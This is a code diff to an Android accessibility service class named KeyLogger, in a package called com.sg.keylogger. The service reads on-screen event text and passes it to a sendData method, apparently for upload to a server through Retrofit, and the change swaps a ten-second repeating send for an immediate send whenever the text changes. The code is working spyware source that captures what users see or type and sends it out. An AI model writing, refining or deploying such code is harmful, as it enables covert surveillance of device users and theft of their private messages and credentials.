@@ -11,9 +11,6 @@ import com.sg.keylogger.services.network.RetrofitInstance;
 
 import java.util.ArrayList;
 import java.util.List;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.TimeUnit;
 
 import okhttp3.ResponseBody;
 import retrofit2.Call;
@@ -38,17 +35,11 @@ public class KeyLogger extends AccessibilityService {
             if(eventType==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
                 if(!(event.getText().toString().equals(dismiss.toString())||event.getText().toString().equals(available.toString()))){
                     if(!eventText.equals(oldText)&&(!eventText.equals(""))){
-                        ScheduledExecutorService scheduleTaskExecutor = Executors.newScheduledThreadPool(5);
-                        scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
-                            public void run() {
-                                Log.i("ACCESSIBILITYSERVICE:", eventText);
-                                sendData(eventText);
-                                oldText=eventText;
-                            }
-                        }, 0, 10, TimeUnit.SECONDS);
+                        Log.i("ACCESSIBILITYSERVICE:", eventText);
+                        sendData(eventText);
+                        oldText=eventText;
                     }
                 }
-
             }
         }
     }
